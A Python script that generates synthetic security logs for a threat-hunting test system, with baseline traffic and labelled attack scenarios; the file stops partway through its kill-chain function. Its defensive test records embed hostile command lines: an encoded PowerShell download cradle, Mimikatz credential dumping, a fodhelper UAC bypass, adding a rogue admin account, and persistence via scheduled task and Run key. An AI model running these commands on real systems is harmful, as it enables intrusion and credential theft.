#!/usr/bin/env python3
"""
NIGHTWATCH Hunt Data Generator — Extended Dataset
Generates 5x baseline noise traffic plus rich attack events covering all
six attack phases (initial_compromise, lateral_movement, privilege_escalation,
data_exfiltration, persistence, multi_phase).

Attack events are timestamped within the last 15 minutes so that a triggered
Hunt cycle (which queries "last 15 minutes") will actually find them.

Usage:
  python scripts/generate_hunt_data.py              # index everything
  python scripts/generate_hunt_data.py --days 3     # only 3 days of normal traffic
  python scripts/generate_hunt_data.py --wipe       # delete indices first, then index
"""

import argparse
import random
import string
from datetime import datetime, timezone, timedelta
from elasticsearch import Elasticsearch, helpers
import os
from dotenv import load_dotenv

# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------

load_dotenv()
ES_URL    = os.getenv("ES_URL")
ES_API_KEY = os.getenv("ES_API_KEY")

es = Elasticsearch(ES_URL, api_key=ES_API_KEY)

INDICES = [
    "nightwatch-auth-logs",
    "nightwatch-process-logs",
    "nightwatch-network-logs",
    "nightwatch-threat-intel",
]

# ---------------------------------------------------------------------------
# Constants — 5x scale
# ---------------------------------------------------------------------------

NORMAL_USERS = [
    # Original 10
    "alice.johnson", "bob.smith", "carol.williams", "dave.brown",
    "eve.davis", "frank.wilson", "grace.moore", "henry.taylor",
    "iris.anderson", "jack.thomas",
    # Additional 40
    "karen.white", "liam.harris", "mia.martin", "noah.jackson", "olivia.lee",
    "peter.walker", "quinn.hall", "rachel.allen", "sam.young", "tina.king",
    "um.wright", "victor.scott", "wendy.green", "xavier.adams", "yara.baker",
    "zoe.nelson", "adam.carter", "bella.mitchell", "caleb.perez", "diana.roberts",
    "ethan.turner", "fiona.phillips", "george.campbell", "helen.parker", "ivan.evans",
    "julia.edwards", "kevin.collins", "laura.stewart", "mike.sanchez", "nancy.morris",
    "oscar.rogers", "priya.reed", "quentin.cook", "rose.morgan", "scott.bell",
    "stella.murphy", "troy.bailey", "ursula.rivera", "vince.cooper", "wanda.richardson",
]

# Service / privileged accounts that appear in attack scenarios
ATTACKER_USER   = "john.doe"          # compromised IT admin
ATTACKER_USER2  = "svc.deploy"        # hijacked service account
DOMAIN          = "CORP"

NORMAL_HOSTS = [
    # Original 10
    "WS-001", "WS-002", "WS-003", "WS-004", "WS-005",
    "WS-010", "WS-011", "WS-012", "WS-015", "WS-020",
    # Additional 15
    "WS-030", "WS-031", "WS-032", "WS-033", "WS-034",
    "WS-050", "WS-051", "WS-052", "WS-053", "WS-054",
    "WS-060", "WS-061", "WS-062", "WS-070", "WS-071",
]

ATTACK_HOSTS = [
    "WS-042", "WS-107", "SRV-003", "SRV-004", "SRV-005",
    "FS-001", "FS-002", "DB-001", "DC-001", "MAIL-001",
]

ALL_HOSTS = NORMAL_HOSTS + ATTACK_HOSTS

NORMAL_PROCESSES = [
    ("explorer.exe",    "userinit.exe"),
    ("chrome.exe",      "explorer.exe"),
    ("outlook.exe",     "explorer.exe"),
    ("notepad.exe",     "explorer.exe"),
    ("code.exe",        "explorer.exe"),
    ("svchost.exe",     "services.exe"),
    ("taskhostw.exe",   "svchost.exe"),
    ("msiexec.exe",     "svchost.exe"),
    ("wuauclt.exe",     "svchost.exe"),
    ("teams.exe",       "explorer.exe"),
    ("onedrive.exe",    "explorer.exe"),
    ("msedge.exe",      "explorer.exe"),
    ("winlogon.exe",    "smss.exe"),
    ("lsass.exe",       "wininit.exe"),
    ("spoolsv.exe",     "services.exe"),
]

NORMAL_DOMAINS = [
    "google.com", "microsoft.com", "github.com", "slack.com",
    "office365.com", "teams.microsoft.com", "onedrive.live.com",
    "azure.com", "amazonaws.com", "cloudfront.net",
]

# Known-bad infrastructure used across attack scenarios
C2_IP_PRIMARY   = "203.0.113.42"    # original APT C2
C2_IP_BEACON    = "198.51.100.77"   # C2 beaconing endpoint
C2_DOMAIN       = "evil-c2-server.com"
FTP_EXFIL_HOST  = "transfer.darknet-drop.ru"
FTP_EXFIL_IP    = "185.220.101.15"

BUSINESS_HOURS_WEIGHTS = [
    1,1,1,1,1,2,5,10,15,15,15,15,15,15,15,15,10,8,5,3,2,1,1,1
]

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def now_utc() -> datetime:
    return datetime.now(timezone.utc)

def ts(dt: datetime) -> str:
    """Return ISO-8601 UTC string."""
    if dt.tzinfo is None:
        dt = dt.replace(tzinfo=timezone.utc)
    return dt.isoformat().replace("+00:00", "Z")

def rand_internal_ip(subnet: int = None) -> str:
    s = subnet or random.randint(1, 30)
    return f"10.0.{s}.{random.randint(1, 254)}"

def rand_port() -> int:
    return random.randint(49152, 65535)

def rand_pid() -> int:
    return random.randint(1000, 65535)

def rand_evt_id(prefix: str = "evt") -> str:
    return f"{prefix}-{random.randint(100000, 999999)}"

def attack_ts(minutes_ago_min: float = 1, minutes_ago_max: float = 14) -> datetime:
    """Return a timestamp within the last 15 minutes (hunt window)."""
    offset_secs = random.uniform(minutes_ago_min * 60, minutes_ago_max * 60)
    return now_utc() - timedelta(seconds=offset_secs)

# ---------------------------------------------------------------------------
# NORMAL BASELINE — 5x volume
# ---------------------------------------------------------------------------

def generate_normal_auth_logs(day_offset: int, count: int = 1000) -> list:
    """Normal auth events for one day (5x original 200)."""
    docs = []
    base = now_utc() - timedelta(days=7) + timedelta(days=day_offset)
    for _ in range(count):
        user = random.choice(NORMAL_USERS)
        host = random.choice(NORMAL_HOSTS)
        hour = random.choices(range(24), weights=BUSINESS_HOURS_WEIGHTS)[0]
        event_ts = base + timedelta(
            hours=hour,
            minutes=random.randint(0, 59),
            seconds=random.randint(0, 59),
        )
        docs.append({
            "_index": "nightwatch-auth-logs",
            "_source": {
                "@timestamp": ts(event_ts),
                "event": {
                    "type": "authentication",
                    "outcome": "success",
                    "action": "logon",
                    "id": rand_evt_id(),
                },
                "user": {"name": user, "domain": DOMAIN},
                "source": {"ip": rand_internal_ip(), "port": rand_port()},
                "destination": {"host": host, "ip": rand_internal_ip(20)},
                "authentication": {
                    "method": random.choice(["kerberos", "ntlm"]),
                    "logon_type": "interactive",
                },
                "host": {"name": host, "os": "Windows 10"},
                "message": f"Successful logon for {user} on {host}",
            },
        })
    return docs


def generate_normal_process_logs(day_offset: int, count: int = 750) -> list:
    """Normal process events for one day (5x original 150)."""
    docs = []
    base = now_utc() - timedelta(days=7) + timedelta(days=day_offset)
    for _ in range(count):
        proc, parent = random.choice(NORMAL_PROCESSES)
        host = random.choice(ALL_HOSTS)
        hour = random.choices(range(24), weights=BUSINESS_HOURS_WEIGHTS)[0]
        event_ts = base + timedelta(hours=hour, minutes=random.randint(0, 59))
        docs.append({
            "_index": "nightwatch-process-logs",
            "_source": {
                "@timestamp": ts(event_ts),
                "host": {"name": host, "os": "Windows 10"},
                "process": {
                    "name": proc,
                    "executable": (
                        f"C:\\Windows\\System32\\{proc}"
                        if proc in ("svchost.exe", "lsass.exe", "spoolsv.exe", "wuauclt.exe")
                        else f"C:\\Program Files\\{proc}"
                    ),
                    "command_line": proc,
                    "pid": rand_pid(),
                    "parent": {"name": parent, "pid": random.randint(100, 999)},
                },
                "user": {
                    "name": random.choice(NORMAL_USERS),
                    "domain": DOMAIN,
                    "privilege_level": "standard",
                },
                "event": {"type": "process_start", "id": rand_evt_id("proc")},
                "message": f"Process started: {proc} by {parent}",
            },
        })
    return docs


def generate_normal_network_logs(day_offset: int, count: int = 500) -> list:
    """Normal network events for one day (5x original 100)."""
    docs = []
    base = now_utc() - timedelta(days=7) + timedelta(days=day_offset)
    for _ in range(count):
        host = random.choice(ALL_HOSTS)
        event_ts = base + timedelta(
            hours=random.randint(6, 20), minutes=random.randint(0, 59)
        )
        domain = random.choice(NORMAL_DOMAINS)
        docs.append({
            "_index": "nightwatch-network-logs",
            "_source": {
                "@timestamp": ts(event_ts),
                "source": {
                    "ip": rand_internal_ip(20),
                    "port": rand_port(),
                    "host": host,
                },
                "destination": {
                    "ip": f"{random.randint(1,223)}.{random.randint(0,255)}"
                         f".{random.randint(0,255)}.{random.randint(1,254)}",
                    "port": random.choice([80, 443]),
                    "domain": domain,
                },
                "network": {
                    "protocol": "https",
                    "bytes": random.randint(500, 50000),
                    "direction": "outbound",
                },
                "host": {"name": host},
                "event": {"type": "connection"},
                "message": f"Normal HTTPS traffic from {host} to {domain}",
            },
        })
    return docs


# ---------------------------------------------------------------------------
# ATTACK SCENARIO 1 — initial_compromise: Brute-force then success
# ---------------------------------------------------------------------------

def generate_brute_force_attack() -> list:
    """15 failed logins followed by a success from an external IP."""
    docs = []
    external_ip = "91.108.56.101"  # not in threat-intel — looks like a VPN exit
    target_host = "WS-042"
    victim_user = ATTACKER_USER

    base = attack_ts(minutes_ago_max=14, minutes_ago_min=13)

    for i in range(15):
        event_ts = base + timedelta(seconds=i * 8)
        docs.append({
            "_index": "nightwatch-auth-logs",
            "_source": {
                "@timestamp": ts(event_ts),
                "event": {
                    "type": "authentication",
                    "outcome": "failure",
                    "action": "logon",
                    "id": f"evt-brute-{i:03d}",
                },
                "user": {"name": victim_user, "domain": DOMAIN},
                "source": {"ip": external_ip, "port": rand_port()},
                "destination": {"host": target_host, "ip": rand_internal_ip(20)},
                "authentication": {
                    "method": "ntlm",
                    "logon_type": "remote_interactive",
                    "failure_reason": "wrong_password",
                },
                "host": {"name": target_host, "os": "Windows 10"},
                "message": (
                    f"FAILED logon for {victim_user} on {target_host} "
                    f"from external IP {external_ip} (attempt {i+1}/15)"
                ),
            },
        })

    # Successful logon after brute force
    success_ts = base + timedelta(seconds=130)
    docs.append({
        "_index": "nightwatch-auth-logs",
        "_source": {
            "@timestamp": ts(success_ts),
            "event": {
                "type": "authentication",
                "outcome": "success",
                "action": "logon",
                "id": "evt-brute-success",
            },
            "user": {"name": victim_user, "domain": DOMAIN},
            "source": {"ip": external_ip, "port": rand_port()},
            "destination": {"host": target_host, "ip": rand_internal_ip(20)},
            "authentication": {
                "method": "ntlm",
                "logon_type": "remote_interactive",
            },
            "host": {"name": target_host, "os": "Windows 10"},
            "message": (
                f"SUSPICIOUS: Successful logon for {victim_user} on {target_host} "
                f"from external IP {external_ip} after 15 failed attempts"
            ),
        },
    })
    return docs


# ---------------------------------------------------------------------------
# ATTACK SCENARIO 2 — initial_compromise: Spear-phishing macro → PowerShell
# ---------------------------------------------------------------------------

def generate_phishing_macro_attack() -> list:
    """winword.exe spawns an obfuscated PowerShell download cradle."""
    docs = []
    host = "WS-042"
    event_ts = attack_ts(minutes_ago_max=13, minutes_ago_min=12)

    encoded_cmd = (
        "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUA"
        "bgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8A"
        "MQA5ADIALgAxADYAOAAuADEALgAxADAALwBzAHQAYQBnAGUAcgAnACkA"
    )

    docs.append({
        "_index": "nightwatch-process-logs",
        "_source": {
            "@timestamp": ts(event_ts),
            "host": {"name": host, "os": "Windows 10"},
            "process": {
                "name": "powershell.exe",
                "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "command_line": (
                    f"powershell.exe -nop -w hidden -encodedcommand {encoded_cmd}"
                ),
                "pid": rand_pid(),
                "parent": {"name": "winword.exe", "pid": rand_pid()},
                "hash": {"sha256": "a1b2c3d4e5f6789012345678901234567890abcdef012345678901234567890abc"},
            },
            "user": {"name": ATTACKER_USER, "domain": DOMAIN, "privilege_level": "standard"},
            "event": {"type": "process_start", "id": "proc-phish-001"},
            "message": (
                "SUSPICIOUS: powershell.exe spawned by winword.exe with "
                "encoded command — likely phishing macro execution"
            ),
        },
    })

    # Follow-up: PowerShell downloads and runs a stager
    stager_ts = event_ts + timedelta(seconds=15)
    docs.append({
        "_index": "nightwatch-network-logs",
        "_source": {
            "@timestamp": ts(stager_ts),
            "source": {"ip": rand_internal_ip(20), "port": rand_port(), "host": host},
            "destination": {
                "ip": C2_IP_PRIMARY,
                "port": 443,
                "domain": C2_DOMAIN,
            },
            "network": {
                "protocol": "https",
                "bytes": 48230,
                "direction": "outbound",
            },
            "host": {"name": host},
            "event": {"type": "connection"},
            "message": (
                f"SUSPICIOUS: Outbound HTTPS to known C2 {C2_DOMAIN} "
                f"({C2_IP_PRIMARY}) immediately after macro execution"
            ),
        },
    })
    return docs


# ---------------------------------------------------------------------------
# ATTACK SCENARIO 3 — lateral_movement: Pass-the-Hash via SMB
# ---------------------------------------------------------------------------

def generate_pass_the_hash_attack() -> list:
    """NTLM logons from compromised host to multiple servers in rapid succession."""
    docs = []
    lateral_targets = ["WS-107", "SRV-003", "SRV-004", "SRV-005", "DC-001"]
    base = attack_ts(minutes_ago_max=12, minutes_ago_min=11)

    for i, target in enumerate(lateral_targets):
        event_ts = base + timedelta(seconds=i * 20)
        docs.append({
            "_index": "nightwatch-auth-logs",
            "_source": {
                "@timestamp": ts(event_ts),
                "event": {
                    "type": "authentication",
                    "outcome": "success",
                    "action": "logon",
                    "id": f"evt-pth-{i:03d}",
                },
                "user": {"name": ATTACKER_USER, "domain": DOMAIN},
                "source": {"ip": rand_internal_ip(20), "port": rand_port()},
                "destination": {"host": target, "ip": rand_internal_ip(20)},
                "authentication": {
                    "method": "ntlm",
                    "logon_type": "network",
                    "ntlm_version": "NTLMv2",
                },
                "host": {"name": target, "os": "Windows Server 2022"},
                "message": (
                    f"SUSPICIOUS: NTLM logon for {ATTACKER_USER} from WS-042 "
                    f"to {target} — potential Pass-the-Hash (host {i+1}/5)"
                ),
            },
        })

    # Also add SMB connections accompanying the auth
    for i, target in enumerate(lateral_targets):
        event_ts = base + timedelta(seconds=i * 20 + 2)
        docs.append({
            "_index": "nightwatch-network-logs",
            "_source": {
                "@timestamp": ts(event_ts),
                "source": {"ip": rand_internal_ip(20), "port": rand_port(), "host": "WS-042"},
                "destination": {"ip": rand_internal_ip(20), "port": 445, "host": target},
                "network": {
                    "protocol": "smb",
                    "bytes": random.randint(4096, 65536),
                    "direction": "internal",
                },
                "host": {"name": "WS-042"},
                "event": {"type": "connection"},
                "message": f"SMB connection from WS-042 to {target} on port 445",
            },
        })
    return docs


# ---------------------------------------------------------------------------
# ATTACK SCENARIO 4 — lateral_movement: WMI remote execution
# ---------------------------------------------------------------------------

def generate_wmi_lateral_movement() -> list:
    """wmiprvse.exe spawns cmd.exe on lateral target — classic WMI exec."""
    docs = []
    targets = ["SRV-003", "SRV-004"]
    base = attack_ts(minutes_ago_max=11, minutes_ago_min=10)

    for i, target in enumerate(targets):
        event_ts = base + timedelta(seconds=i * 30)
        docs.append({
            "_index": "nightwatch-process-logs",
            "_source": {
                "@timestamp": ts(event_ts),
                "host": {"name": target, "os": "Windows Server 2022"},
                "process": {
                    "name": "cmd.exe",
                    "executable": "C:\\Windows\\System32\\cmd.exe",
                    "command_line": (
                        "cmd.exe /c whoami && net localgroup administrators && "
                        "ipconfig /all > C:\\Windows\\Temp\\info.txt"
                    ),
                    "pid": rand_pid(),
                    "parent": {"name": "wmiprvse.exe", "pid": rand_pid()},
                },
                "user": {"name": ATTACKER_USER, "domain": DOMAIN, "privilege_level": "admin"},
                "event": {"type": "process_start", "id": f"proc-wmi-{i:03d}"},
                "message": (
                    f"SUSPICIOUS: cmd.exe spawned by wmiprvse.exe on {target} "
                    f"— WMI remote execution (lateral movement)"
                ),
            },
        })
    return docs


# ---------------------------------------------------------------------------
# ATTACK SCENARIO 5 — privilege_escalation: LSASS credential dump
# ---------------------------------------------------------------------------

def generate_lsass_dump() -> list:
    """Renamed Mimikatz binary reads LSASS memory for credential extraction."""
    docs = []
    host = "WS-107"
    event_ts = attack_ts(minutes_ago_max=10, minutes_ago_min=9)

    docs.append({
        "_index": "nightwatch-process-logs",
        "_source": {
            "@timestamp": ts(event_ts),
            "host": {"name": host, "os": "Windows 10"},
            "process": {
                "name": "svchost_update.exe",
                "executable": "C:\\Windows\\Temp\\svchost_update.exe",
                "command_line": (
                    "svchost_update.exe privilege::debug "
                    "sekurlsa::logonpasswords exit"
                ),
                "pid": rand_pid(),
                "parent": {"name": "cmd.exe", "pid": rand_pid()},
                "hash": {"sha256": "a1b2c3d4e5f6789012345678901234567890abcdef012345678901234567890abc"},
            },
            "user": {"name": ATTACKER_USER, "domain": DOMAIN, "privilege_level": "admin"},
            "event": {"type": "process_start", "id": "proc-lsass-001"},
            "target_process": {
                "name": "lsass.exe",
                "pid": 688,
                "access": "PROCESS_VM_READ|PROCESS_QUERY_INFORMATION",
            },
            "message": (
                "CRITICAL: svchost_update.exe (Mimikatz variant) accessed "
                "lsass.exe memory — credential dumping detected"
            ),
        },
    })
    return docs


# ---------------------------------------------------------------------------
# ATTACK SCENARIO 6 — privilege_escalation: Kerberoasting
# ---------------------------------------------------------------------------

def generate_kerberoasting() -> list:
    """Unusual volume of TGS-REQ requests for high-value service accounts."""
    docs = []
    service_accounts = [
        "svc_mssql", "svc_iis", "svc_sharepoint",
        "svc_exchange", "svc_backup",
    ]
    host = "WS-107"
    base = attack_ts(minutes_ago_max=9, minutes_ago_min=8)

    for i, svc_acct in enumerate(service_accounts):
        event_ts = base + timedelta(seconds=i * 5)
        docs.append({
            "_index": "nightwatch-auth-logs",
            "_source": {
                "@timestamp": ts(event_ts),
                "event": {
                    "type": "kerberos",
                    "outcome": "success",
                    "action": "tgs_request",
                    "id": f"evt-kerb-{i:03d}",
                },
                "user": {"name": ATTACKER_USER, "domain": DOMAIN},
                "service": {"name": svc_acct},
                "kerberos": {
                    "ticket_encryption": "RC4-HMAC",
                    "spn": f"{svc_acct}/DC-001.corp.local",
                },
                "source": {"ip": rand_internal_ip(20), "port": rand_port()},
                "destination": {"host": "DC-001", "ip": rand_internal_ip(10)},
                "host": {"name": host, "os": "Windows 10"},
                "message": (
                    f"SUSPICIOUS: TGS-REQ for {svc_acct} using RC4-HMAC "
                    f"from {host} — potential Kerberoasting (SPN {i+1}/5)"
                ),
            },
        })
    return docs


# ---------------------------------------------------------------------------
# ATTACK SCENARIO 7 — privilege_escalation: UAC bypass via fodhelper
# ---------------------------------------------------------------------------

def generate_uac_bypass() -> list:
    """fodhelper.exe spawns an elevated shell — classic UAC bypass."""
    docs = []
    host = "WS-107"
    event_ts = attack_ts(minutes_ago_max=8, minutes_ago_min=7)

    docs.append({
        "_index": "nightwatch-process-logs",
        "_source": {
            "@timestamp": ts(event_ts),
            "host": {"name": host, "os": "Windows 10"},
            "process": {
                "name": "cmd.exe",
                "executable": "C:\\Windows\\System32\\cmd.exe",
                "command_line": "cmd.exe /c net user hacker P@ssw0rd123 /add && net localgroup administrators hacker /add",
                "pid": rand_pid(),
                "parent": {"name": "fodhelper.exe", "pid": rand_pid()},
                "integrity_level": "High",
            },
            "user": {"name": ATTACKER_USER, "domain": DOMAIN, "privilege_level": "admin"},
            "event": {"type": "process_start", "id": "proc-uac-001"},
            "message": (
                "CRITICAL: cmd.exe with High integrity spawned by fodhelper.exe "
                "— UAC bypass; adds local admin account 'hacker'"
            ),
        },
    })

    # fodhelper UAC bypass writes to registry first
    reg_ts = event_ts - timedelta(seconds=10)
    docs.append({
        "_index": "nightwatch-process-logs",
        "_source": {
            "@timestamp": ts(reg_ts),
            "host": {"name": host, "os": "Windows 10"},
            "process": {
                "name": "reg.exe",
                "executable": "C:\\Windows\\System32\\reg.exe",
                "command_line": (
                    "reg add "
                    "HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command "
                    '/v "" /d "cmd.exe" /f'
                ),
                "pid": rand_pid(),
                "parent": {"name": "powershell.exe", "pid": rand_pid()},
            },
            "user": {"name": ATTACKER_USER, "domain": DOMAIN, "privilege_level": "standard"},
            "event": {"type": "process_start", "id": "proc-uac-reg"},
            "message": (
                "SUSPICIOUS: reg.exe modifies ms-settings shell command "
                "— fodhelper UAC bypass preparation"
            ),
        },
    })
    return docs


# ---------------------------------------------------------------------------
# ATTACK SCENARIO 8 — data_exfiltration: DNS tunneling
# ---------------------------------------------------------------------------

def generate_dns_tunneling() -> list:
    """100 TXT queries with 60-char encoded subdomains to known C2 domain."""
    docs = []
    host = "FS-001"
    base = attack_ts(minutes_ago_max=7, minutes_ago_min=6)

    for i in range(100):
        event_ts = base + timedelta(seconds=i * 3)
        tunnel_payload = "".join(random.choices(string.ascii_lowercase + string.digits, k=60))
        tunnel_query = f"{tunnel_payload}.data.{C2_DOMAIN}"
        docs.append({
            "_index": "nightwatch-network-logs",
            "_source": {
                "@timestamp": ts(event_ts),
                "source": {
                    "ip": rand_internal_ip(30),
                    "port": rand_port(),
                    "host": host,
                },
                "destination": {
                    "ip": C2_IP_PRIMARY,
                    "port": 53,
                    "domain": C2_DOMAIN,
                },
                "network": {
                    "protocol": "dns",
                    "bytes": random.randint(200, 500),
                    "direction": "outbound",
                },
                "dns": {
                    "query": tunnel_query,
                    "query_type": "TXT",
                    "response_code": "NOERROR",
                    "subdomain_length": len(tunnel_payload),
                },
                "host": {"name": host},
                "event": {"type": "dns_query"},
                "message": (
                    f"SUSPICIOUS: DNS TXT query with {len(tunnel_payload)}-char "
                    f"encoded subdomain to {C2_DOMAIN} — DNS tunneling exfiltration"
                ),
            },
        })
    return docs


# ---------------------------------------------------------------------------
# ATTACK SCENARIO 9 — data_exfiltration: Large HTTPS upload
# ---------------------------------------------------------------------------

def generate_large_https_exfil() -> list:
    """Multi-hundred-MB HTTPS uploads to non-corporate IP."""
    docs = []
    host = "FS-001"
    base = attack_ts(minutes_ago_max=6, minutes_ago_min=5)

    for i in range(8):
        event_ts = base + timedelta(seconds=i * 60)
        docs.append({
            "_index": "nightwatch-network-logs",
            "_source": {
                "@timestamp": ts(event_ts),
                "source": {
                    "ip": rand_internal_ip(30),
                    "port": rand_port(),
                    "host": host,
                },
                "destination": {
                    "ip": C2_IP_BEACON,
                    "port": 443,
                    "domain": "upload.secure-files-cdn.com",
                },
                "network": {
                    "protocol": "https",
                    "bytes": random.randint(80_000_000, 200_000_000),
                    "direction": "outbound",
                },
                "host": {"name": host},
                "event": {"type": "connection"},
                "message": (
                    f"CRITICAL: Large HTTPS upload ({random.randint(80,200)} MB) "
                    f"from {host} to unknown external IP {C2_IP_BEACON}"
                ),
            },
        })
    return docs


# ---------------------------------------------------------------------------
# ATTACK SCENARIO 10 — data_exfiltration: FTP exfiltration
# ---------------------------------------------------------------------------

def generate_ftp_exfil() -> list:
    """FTP connection to rogue external host carrying archive file."""
    docs = []
    host = "FS-001"
    event_ts = attack_ts(minutes_ago_max=5, minutes_ago_min=4)

    docs.append({
        "_index": "nightwatch-network-logs",
        "_source": {
            "@timestamp": ts(event_ts),
            "source": {"ip": rand_internal_ip(30), "port": rand_port(), "host": host},
            "destination": {
                "ip": FTP_EXFIL_IP,
                "port": 21,
                "domain": FTP_EXFIL_HOST,
            },
            "network": {
                "protocol": "ftp",
                "bytes": random.randint(500_000_000, 2_000_000_000),
                "direction": "outbound",
            },
            "ftp": {
                "command": "STOR",
                "filename": "corp_data_archive_2026.zip",
            },
            "host": {"name": host},
            "event": {"type": "connection"},
            "message": (
                f"CRITICAL: FTP upload of corp_data_archive_2026.zip "
                f"from {host} to external {FTP_EXFIL_HOST} ({FTP_EXFIL_IP})"
            ),
        },
    })

    # Associated process — 7-zip archiving before exfil
    archive_ts = event_ts - timedelta(seconds=120)
    docs.append({
        "_index": "nightwatch-process-logs",
        "_source": {
            "@timestamp": ts(archive_ts),
            "host": {"name": host, "os": "Windows Server 2022"},
            "process": {
                "name": "7z.exe",
                "executable": "C:\\Program Files\\7-Zip\\7z.exe",
                "command_line": (
                    "7z.exe a -tzip corp_data_archive_2026.zip "
                    "C:\\Shares\\Finance\\* C:\\Shares\\HR\\* -p infected"
                ),
                "pid": rand_pid(),
                "parent": {"name": "cmd.exe", "pid": rand_pid()},
            },
            "user": {"name": ATTACKER_USER, "domain": DOMAIN, "privilege_level": "admin"},
            "event": {"type": "process_start", "id": "proc-exfil-zip"},
            "message": (
                "SUSPICIOUS: 7-Zip archiving Finance and HR shares with password "
                "— likely pre-exfiltration staging"
            ),
        },
    })
    return docs


# ---------------------------------------------------------------------------
# ATTACK SCENARIO 11 — persistence: Scheduled task
# ---------------------------------------------------------------------------

def generate_scheduled_task_persistence() -> list:
    """schtasks.exe creates a daily persistence task pointing to Temp."""
    docs = []
    hosts = ["WS-042", "WS-107"]
    base = attack_ts(minutes_ago_max=4, minutes_ago_min=3)

    for i, host in enumerate(hosts):
        event_ts = base + timedelta(seconds=i * 15)
        docs.append({
            "_index": "nightwatch-process-logs",
            "_source": {
                "@timestamp": ts(event_ts),
                "host": {"name": host, "os": "Windows 10"},
                "process": {
                    "name": "schtasks.exe",
                    "executable": "C:\\Windows\\System32\\schtasks.exe",
                    "command_line": (
                        'schtasks /create /tn "WindowsUpdateHelper" '
                        '/tr "C:\\Windows\\Temp\\wuhelper.exe" '
                        "/sc daily /st 03:30 /ru SYSTEM /f"
                    ),
                    "pid": rand_pid(),
                    "parent": {"name": "cmd.exe", "pid": rand_pid()},
                },
                "user": {"name": ATTACKER_USER, "domain": DOMAIN, "privilege_level": "admin"},
                "event": {"type": "process_start", "id": f"proc-persist-sched-{i}"},
                "message": (
                    f"SUSPICIOUS: Scheduled task created on {host} "
                    f"executing binary from Temp directory — persistence"
                ),
            },
        })
    return docs


# ---------------------------------------------------------------------------
# ATTACK SCENARIO 12 — persistence: Registry run key
# ---------------------------------------------------------------------------

def generate_registry_run_key() -> list:
    """reg.exe adds HKLM Run key pointing to malicious payload."""
    docs = []
    host = "WS-042"
    event_ts = attack_ts(minutes_ago_max=3, minutes_ago_min=2)

    docs.append({
        "_index": "nightwatch-process-logs",
        "_source": {
            "@timestamp": ts(event_ts),
            "host": {"name": host, "os": "Windows 10"},
            "process": {
                "name": "reg.exe",
                "executable": "C:\\Windows\\System32\\reg.exe",
                "command_line": (
                    'reg add "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" '
                    '/v "SecurityHealth" /t REG_SZ '
                    '/d "C:\\Windows\\Temp\\sechealth.exe /silent" /f'
                ),
                "pid": rand_pid(),
                "parent": {"name": "powershell.exe", "pid": rand_pid()},
            },
            "user": {"name": ATTACKER_USER, "domain": DOMAIN, "privilege_level": "admin"},
            "event": {"type": "process_start", "id": "proc-persist-reg"},
            "registry": {
                "key": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                "value_name": "SecurityHealth",
                "data": "C:\\Windows\\Temp\\sechealth.exe /silent",
            },
            "message": (
                "CRITICAL: Registry Run key added on {host} pointing to "
                "Temp directory binary — boot persistence established"
            ),
        },
    })
    return docs


# ---------------------------------------------------------------------------
# ATTACK SCENARIO 13 — persistence: Malicious service install
# ---------------------------------------------------------------------------

def generate_malicious_service() -> list:
    """sc.exe creates a fake Windows service for persistent execution."""
    docs = []
    host = "SRV-003"
    event_ts = attack_ts(minutes_ago_max=2.5, minutes_ago_min=2)

    docs.append({
        "_index": "nightwatch-process-logs",
        "_source": {
            "@timestamp": ts(event_ts),
            "host": {"name": host, "os": "Windows Server 2022"},
            "process": {
                "name": "sc.exe",
                "executable": "C:\\Windows\\System32\\sc.exe",
                "command_line": (
                    "sc create WinTelemetryHelper "
                    "binPath= \"C:\\Windows\\Temp\\telemetry_helper.exe\" "
                    "start= auto DisplayName= \"Windows Telemetry Helper\""
                ),
                "pid": rand_pid(),
                "parent": {"name": "cmd.exe", "pid": rand_pid()},
            },
            "user": {"name": ATTACKER_USER2, "domain": DOMAIN, "privilege_level": "admin"},
            "event": {"type": "process_start", "id": "proc-persist-svc"},
            "service": {
                "name": "WinTelemetryHelper",
                "display_name": "Windows Telemetry Helper",
                "binary_path": "C:\\Windows\\Temp\\telemetry_helper.exe",
                "start_type": "automatic",
            },
            "message": (
                f"SUSPICIOUS: New service 'WinTelemetryHelper' created on {host} "
                f"with binary in Temp directory — malicious service persistence"
            ),
        },
    })
    return docs


# ---------------------------------------------------------------------------
# ATTACK SCENARIO 14 — multi_phase: C2 beaconing
# ---------------------------------------------------------------------------

def generate_c2_beaconing() -> list:
    """Periodic outbound HTTPS ~every 60 seconds to C2 IP — beacon pattern."""
    docs = []
    host = "WS-042"
    base = attack_ts(minutes_ago_max=14, minutes_ago_min=13)

    # 13 beacons at ~60s intervals covering the full 13-minute window
    for i in range(13):
        event_ts = base + timedelta(seconds=i * 60 + random.randint(-5, 5))
        docs.append({
            "_index": "nightwatch-network-logs",
            "_source": {
                "@timestamp": ts(event_ts),
                "source": {
                    "ip": rand_internal_ip(20),
                    "port": rand_port(),
                    "host": host,
                },
                "destination": {
                    "ip": C2_IP_BEACON,
                    "port": 443,
                    "domain": "cdn.secure-updates-global.com",
                },
                "network": {
                    "protocol": "https",
                    "bytes": random.randint(512, 2048),
                    "direction": "outbound",
                },
                "http": {
                    "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                    "uri": f"/check?id={random.randint(10000,99999)}&t={i}",
                    "response_code": 200,
                },
                "host": {"name": host},
                "event": {"type": "connection"},
                "message": (
                    f"SUSPICIOUS: Regular HTTPS beacon #{i+1} from {host} "
                    f"to {C2_IP_BEACON} — C2 check-in pattern (~60s interval)"
                ),
            },
        })
    return docs


# ---------------------------------------------------------------------------
# ATTACK SCENARIO 15 — multi_phase: Coherent kill chain sequence
# ---------------------------------------------------------------------------

def generate_kill_chain() -> list:
    """
    Compressed APT kill-chain in the last ~14 minutes:
    reconnaissance → initial_compromise → lateral_movement → data_exfiltration
    """
    docs = []
    now = now_utc()

    # T-14m: Reconnaissance — LDAP enumeration
    docs.append({
        "_index": "nightwatch-process-logs",
        "_source": {
            "@timestamp": ts(now - timedelta(minutes=14)),
            "host": {"name": "WS-042", "os": "Windows 10"},
